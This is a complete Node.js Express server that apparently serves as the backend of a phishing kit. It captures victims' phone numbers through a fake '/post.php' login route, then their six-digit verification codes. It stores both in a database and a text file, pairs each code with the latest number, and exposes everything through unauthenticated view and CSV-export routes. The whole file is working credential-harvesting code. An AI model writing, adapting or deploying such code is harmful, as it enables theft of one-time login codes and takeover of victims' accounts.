const express = require('express');
const fs = require('fs');
const path = require('path');
const bodyParser = require('body-parser');
const { Pool } = require('pg');

const app = express();
const PORT = process.env.PORT || 3000;

// Middleware
app.use(bodyParser.urlencoded({ extended: true }));
app.use(bodyParser.json());
app.use(express.static('.')); // Serve static files from current directory

// PostgreSQL connection
const pool = new Pool({
  connectionString: process.env.DATABASE_URL,
  ssl: process.env.DATABASE_URL ? { rejectUnauthorized: false } : false
});

// Create table if it doesn't exist
const initDB = async () => {
  try {
    await pool.query(`
      CREATE TABLE IF NOT EXISTS user_logs (
        id SERIAL PRIMARY KEY,
        timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
        phone_number VARCHAR(20),
        verification_code VARCHAR(6),
        created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
      )
    `);
    console.log('Database initialized');
  } catch (err) {
    console.error('Error initializing database:', err);
  }
};

initDB();

// Also keep file logging as backup (will work locally)
const usersFile = path.join(__dirname, 'users.txt');
if (!fs.existsSync(usersFile)) {
  fs.writeFileSync(usersFile, '');
}

// Handle POST request from login form
app.post('/post.php', async (req, res) => {
  const { country_code, phone } = req.body;
  const timestamp = new Date().toISOString();
  const fullPhone = `${country_code}${phone}`;
  
  // Save to database
  try {
    await pool.query(
      'INSERT INTO user_logs (phone_number) VALUES ($1)',
      [fullPhone]
    );
    console.log('Phone number saved to DB:', { phone: fullPhone, timestamp });
  } catch (err) {
    console.error('Error saving to database:', err);
  }
  
  // Also save to file (for local development)
  try {
    const userData = `Timestamp: ${timestamp}\nPhone Number: ${fullPhone}\n${'='.repeat(50)}\n`;
    fs.appendFileSync(usersFile, userData);
    console.log('Phone number saved to file:', { phone: fullPhone, timestamp });
  } catch (err) {
    console.error('Error writing to file:', err);
  }
  
  // Redirect to verification page
  res.redirect('/verification.html');
});

// Handle POST request from verification form
app.post('/verify-code', async (req, res) => {
  const { digit1, digit2, digit3, digit4, digit5, digit6 } = req.body;
  const code = `${digit1}${digit2}${digit3}${digit4}${digit5}${digit6}`;
  const timestamp = new Date().toISOString();
  
  // Save to database
  try {
    // Update the most recent entry (last phone number) with the verification code
    await pool.query(
      `UPDATE user_logs 
       SET verification_code = $1 
       WHERE id = (SELECT id FROM user_logs ORDER BY id DESC LIMIT 1)`,
      [code]
    );
    console.log('Verification code saved to DB:', { code, timestamp });
  } catch (err) {
    console.error('Error saving to database:', err);
  }
  
  // Also save to file (for local development)
  try {
    const codeData = `Timestamp: ${timestamp}\nVerification Code: ${code}\n${'='.repeat(50)}\n`;
    fs.appendFileSync(usersFile, codeData);
    console.log('Verification code saved to file:', { code, timestamp });
  } catch (err) {
    console.error('Error writing to file:', err);
  }
  
  // Redirect back to login page
  res.redirect('/verification.html');
});

// View all saved users from database
app.get('/view-users', async (req, res) => {
  try {
    const result = await pool.query(
      'SELECT * FROM user_logs ORDER BY id DESC'
    );
    
    let output = 'USER LOGS FROM DATABASE:\n\n';
    result.rows.forEach(row => {
      output += `ID: ${row.id}\n`;
      output += `Timestamp: ${row.timestamp}\n`;
      output += `Phone Number: ${row.phone_number || 'N/A'}\n`;
      output += `Verification Code: ${row.verification_code || 'N/A'}\n`;
      output += '='.repeat(50) + '\n\n';
    });
    
    res.type('text/plain').send(output || 'No users saved yet.');
  } catch (err) {
    console.error('Error reading from database:', err);
    
    // Fallback to file if database fails
    fs.readFile(usersFile, 'utf8', (err, data) => {
      if (err) {
        return res.status(500).send('Error reading data');
      }
      res.type('text/plain').send(data || 'No users saved yet.');
    });
  }
});

// Export data as CSV
app.get('/export-csv', async (req, res) => {
  try {
    const result = await pool.query(
      'SELECT * FROM user_logs ORDER BY id DESC'
    );
    
    let csv = 'ID,Timestamp,Phone Number,Verification Code\n';
    result.rows.forEach(row => {
      csv += `${row.id},"${row.timestamp}","${row.phone_number || ''}","${row.verification_code || ''}"\n`;
    });
    
    res.setHeader('Content-Type', 'text/csv');
    res.setHeader('Content-Disposition', 'attachment; filename=user_logs.csv');
    res.send(csv);
  } catch (err) {
    console.error('Error exporting CSV:', err);
    res.status(500).send('Error exporting data');
  }
});

app.listen(PORT, () => {
  console.log(`Server running at http://localhost:${PORT}`);
  console.log(`Database: ${process.env.DATABASE_URL ? 'Connected' : 'Not configured (using file only)'}`);
  console.log(`Users file: ${usersFile}`);
});
